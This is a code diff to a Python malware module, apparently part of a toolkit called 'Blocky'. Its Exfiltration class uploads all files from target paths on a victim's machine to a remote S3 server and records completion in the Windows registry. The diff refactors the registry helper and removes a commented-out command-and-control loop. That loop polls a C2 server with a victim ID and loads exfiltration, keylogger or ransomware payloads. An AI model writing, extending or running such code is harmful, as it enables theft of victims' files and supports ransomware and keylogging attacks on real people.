@@ -2,7 +2,7 @@
 
 # Additional modules -> install via pip
 import httpx  # Handling HTTP requests/responses
-import minio
+import minio  # Handling Minio S3 storage
 
 # Native modules
 import pathlib  # Handling file paths
@@ -93,6 +93,17 @@ class Exfiltration:
             print(f"get_s3_credentials(): Error --> {err}")
             return False
 
+    def create_registry_entry(self, subkey, subkeyvalue):
+        keyName = r"Software\Blocky\Main"
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
+            )
+        except:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
+        winreg.SetValueEx(key, subkey, 0, winreg.REG_SZ, subkeyvalue)
+        winreg.CloseKey(key)
+
     def upload_to_s3(self):
         """Uploads all files in target_paths to the remote S3 server"""
         # Create a minio client object
@@ -124,41 +135,8 @@ class Exfiltration:
                 except Exception as err:
                     print(f"upload_to_s3(): Error --> {err}")
                     return False
+        self.create_registry_entry("ExfiltrationFinished", "True")
         return True
-
-    def create_finished_registry_entry(self):
-        keyName = r"Software\Blocky\Main"
-        try:
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
-            )
-        except:
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
-        winreg.SetValueEx(key, "ExfiltrationFinished", 0, winreg.REG_SZ, "true")
-        winreg.CloseKey(key)
-
-    # def sync_loop(self):
-    #     while (
-    #         httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "False"
-    #     ):
-    #         sleep(30)
-    #     if (
-    #         httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"]
-    #         == "Exfiltration"
-    #     ):
-    #         self.load_exfiltration()
-    #     elif (
-    #         httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"]
-    #         == "Keylogger"
-    #     ):
-    #         self.load_keylogger()
-    #     elif (
-    #         httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"]
-    #         == "Ransomware"
-    #     ):
-    #         self.load_ransomware()
-    #     else:
-    #         sleep(30)
 
 
 if __name__ == "__main__":
@@ -179,4 +157,3 @@ if __name__ == "__main__":
     # Upload all files in target_paths to the remote S3 server
     exfiltration.upload_to_s3()
     # Create a registry entry to mark the exfiltration as finished
-    exfiltration.create_finished_registry_entry()
